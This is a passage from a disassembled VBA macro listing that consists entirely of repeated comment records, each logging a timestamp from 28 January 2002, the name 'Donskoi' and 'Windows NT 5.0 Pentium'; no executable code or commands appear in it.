' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4185:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4186:
' Line #4187:
' Line #4188:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:03:26"
' Line #4189:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4190:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4191:
' Line #4192:
' Line #4193:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:03:28"
' Line #4194:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4195:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4196:
' Line #4197:
' Line #4198:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:05:09"
' Line #4199:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4200:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4201:
' Line #4202:
' Line #4203:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:05:11"
' Line #4204:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4205:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4206:
' Line #4207:
' Line #4208:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:09:04"
' Line #4209:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4210:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4211:
' Line #4212:
' Line #4213:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:09:06"
' Line #4214:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4215:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4216:
' Line #4217:
' Line #4218:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:09:48"
' Line #4219:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4220:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4221:
' Line #4222:
' Line #4223:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:13:21"
' Line #4224:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4225:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4226:
' Line #4227:
' Line #4228:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:14:07"
' Line #4229:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4230:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4231:
' Line #4232:
' Line #4233:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 10:14:09"
' Line #4234:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4235:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4236:
' Line #4237:
' Line #4238:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:17:14"
' Line #4239:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4240:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4241:
' Line #4242:
' Line #4243:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:19:37"
' Line #4244:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4245:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4246:
' Line #4247:
' Line #4248:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:20:24"
' Line #4249:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4250:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4251:
' Line #4252:
' Line #4253:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:29:24"
' Line #4254:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4255:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4256:
' Line #4257:
' Line #4258:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:32:22"
' Line #4259:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4260:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4261:
' Line #4262:
' Line #4263:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:34:24"
' Line #4264:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4265:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4266:
' Line #4267:
' Line #4268:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:38:12"
' Line #4269:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4270:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4271:
' Line #4272:
' Line #4273:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:38:24"
' Line #4274:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4275:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4276:
' Line #4277:
' Line #4278:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:39:09"
' Line #4279:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4280:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4281:
' Line #4282:
' Line #4283:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:39:19"
' Line #4284:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4285:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4286:
' Line #4287:
' Line #4288:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:48:53"
' Line #4289:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4290:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4291:
' Line #4292:
' Line #4293:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:48:55"
' Line #4294:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4295:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4296:
' Line #4297:
' Line #4298:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:49:20"
' Line #4299:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4300:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4301:
' Line #4302:
' Line #4303:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:49:22"
' Line #4304:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4305:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4306:
' Line #4307:
' Line #4308:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 11:55:00"
' Line #4309:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4310:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4311:
' Line #4312:
' Line #4313:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:19:28"
' Line #4314:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4315:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4316:
' Line #4317:
' Line #4318:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:21:50"
' Line #4319:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4320:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4321:
' Line #4322:
' Line #4323:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:26:43"
' Line #4324:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4325:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4326:
' Line #4327:
' Line #4328:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:27:22"
' Line #4329:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4330:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4331:
' Line #4332:
' Line #4333:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:31:16"
' Line #4334:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4335:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4336:
' Line #4337:
' Line #4338:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:32:13"
' Line #4339:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4340:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4341:
' Line #4342:
' Line #4343:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:32:46"
' Line #4344:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4345:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4346:
' Line #4347:
' Line #4348:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:34:49"
' Line #4349:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4350:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4351:
' Line #4352:
' Line #4353:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:35:04"
' Line #4354:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4355:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4356:
' Line #4357:
' Line #4358:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:35:37"
' Line #4359:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4360:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4361:
' Line #4362:
' Line #4363:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:35:51"
' Line #4364:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4365:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4366:
' Line #4367:
' Line #4368:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:36:11"
' Line #4369:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4370:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4371:
' Line #4372:
' Line #4373:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:36:23"
' Line #4374:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4375:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4376:
' Line #4377:
' Line #4378:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:36:42"
' Line #4379:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4380:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4381:
' Line #4382:
' Line #4383:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:36:53"
' Line #4384:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4385:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4386:
' Line #4387:
' Line #4388:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:37:04"
' Line #4389:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4390:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4391:
' Line #4392:
' Line #4393:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:37:19"
' Line #4394:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4395:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4396:
' Line #4397:
' Line #4398:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:37:33"
' Line #4399:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4400:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4401:
' Line #4402:
' Line #4403:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:37:42"
' Line #4404:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4405:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4406:
' Line #4407:
' Line #4408:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:40:33"
' Line #4409:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4410:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4411:
' Line #4412:
' Line #4413:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:42:31"
' Line #4414:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4415:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4416:
' Line #4417:
' Line #4418:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:48:21"
' Line #4419:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4420:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4421:
' Line #4422:
' Line #4423:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:52:58"
' Line #4424:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4425:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4426:
' Line #4427:
' Line #4428:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 12:58:04"
' Line #4429:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4430:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4431:
' Line #4432:
' Line #4433:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:00:23"
' Line #4434:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4435:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4436:
' Line #4437:
' Line #4438:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:00:25"
' Line #4439:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4440:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4441:
' Line #4442:
' Line #4443:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:00:37"
' Line #4444:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4445:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4446:
' Line #4447:
' Line #4448:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:01:32"
' Line #4449:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4450:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4451:
' Line #4452:
' Line #4453:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:11:23"
' Line #4454:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4455:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4456:
' Line #4457:
' Line #4458:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:12:42"
' Line #4459:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4460:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4461:
' Line #4462:
' Line #4463:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:14:10"
' Line #4464:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4465:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4466:
' Line #4467:
' Line #4468:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 13:16:40"
' Line #4469:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4470:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4471:
' Line #4472:
' Line #4473:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:10:39"
' Line #4474:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4475:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4476:
' Line #4477:
' Line #4478:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:11:04"
' Line #4479:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4480:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4481:
' Line #4482:
' Line #4483:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:13:11"
' Line #4484:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4485:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4486:
' Line #4487:
' Line #4488:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:18:31"
' Line #4489:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4490:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4491:
' Line #4492:
' Line #4493:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:21:49"
' Line #4494:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4495:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4496:
' Line #4497:
' Line #4498:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:40:36"
' Line #4499:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4500:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4501:
' Line #4502:
' Line #4503:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:41:28"
' Line #4504:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4505:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4506:
' Line #4507:
' Line #4508:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:41:50"
' Line #4509:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4510:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4511:
' Line #4512:
' Line #4513:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:42:19"
' Line #4514:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4515:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4516:
' Line #4517:
' Line #4518:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:42:38"
' Line #4519:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4520:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4521:
' Line #4522:
' Line #4523:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:43:13"
' Line #4524:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4525:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4526:
' Line #4527:
' Line #4528:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:43:34"
' Line #4529:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4530:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4531:
' Line #4532:
' Line #4533:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:44:12"
' Line #4534:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4535:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4536:
' Line #4537:
' Line #4538:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:44:45"
' Line #4539:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4540:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4541:
' Line #4542:
' Line #4543:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:45:05"
' Line #4544:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4545:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4546:
' Line #4547:
' Line #4548:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:45:35"
' Line #4549:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4550:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4551:
' Line #4552:
' Line #4553:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:45:57"
' Line #4554:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4555:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4556:
' Line #4557:
' Line #4558:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:46:26"
' Line #4559:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4560:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4561:
' Line #4562:
' Line #4563:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:46:48"
' Line #4564:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4565:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4566:
' Line #4567:
' Line #4568:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:47:20"
' Line #4569:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4570:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4571:
' Line #4572:
' Line #4573:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:47:47"
' Line #4574:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4575:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4576:
' Line #4577:
' Line #4578:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:48:23"
' Line #4579:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4580:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4581:
' Line #4582:
' Line #4583:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:48:37"
' Line #4584:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4585:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4586:
' Line #4587:
' Line #4588:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:48:57"
' Line #4589:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4590:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4591:
' Line #4592:
' Line #4593:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:49:24"
' Line #4594:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4595:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4596:
' Line #4597:
' Line #4598:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:49:42"
' Line #4599:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4600:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4601:
' Line #4602:
' Line #4603:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:50:11"
' Line #4604:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4605:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4606:
' Line #4607:
' Line #4608:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:50:28"
' Line #4609:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4610:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4611:
' Line #4612:
' Line #4613:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:51:06"
' Line #4614:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4615:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4616:
' Line #4617:
' Line #4618:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 14:51:22"
' Line #4619:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4620:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4621:
' Line #4622:
' Line #4623:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:17:21"
' Line #4624:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4625:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4626:
' Line #4627:
' Line #4628:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:18:44"
' Line #4629:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4630:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4631:
' Line #4632:
' Line #4633:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:18:56"
' Line #4634:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4635:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4636:
' Line #4637:
' Line #4638:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:21:45"
' Line #4639:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4640:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4641:
' Line #4642:
' Line #4643:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:22:15"
' Line #4644:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4645:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4646:
' Line #4647:
' Line #4648:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:22:29"
' Line #4649:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4650:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4651:
' Line #4652:
' Line #4653:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:23:10"
' Line #4654:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4655:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4656:
' Line #4657:
' Line #4658:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:43:27"
' Line #4659:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4660:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4661:
' Line #4662:
' Line #4663:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:53:45"
' Line #4664:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4665:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4666:
' Line #4667:
' Line #4668:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:56:13"
' Line #4669:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4670:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4671:
' Line #4672:
' Line #4673:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:57:33"
' Line #4674:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4675:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4676:
' Line #4677:
' Line #4678:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:58:58"
' Line #4679:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4680:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4681:
' Line #4682:
' Line #4683:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:59:15"
' Line #4684:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4685:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4686:
' Line #4687:
' Line #4688:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 15:59:30"
' Line #4689:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4690:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4691:
' Line #4692:
' Line #4693:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:06:42"
' Line #4694:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4695:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4696:
' Line #4697:
' Line #4698:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:07:14"
' Line #4699:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4700:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4701:
' Line #4702:
' Line #4703:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:07:29"
' Line #4704:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4705:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4706:
' Line #4707:
' Line #4708:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:07:48"
' Line #4709:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4710:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4711:
' Line #4712:
' Line #4713:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:10:32"
' Line #4714:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #4715:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #4716:
' Line #4717:
' Line #4718:
' 	QuoteRem 0x0000 0x0013 "28.01.2002 16:10:52"
' Line #4719:
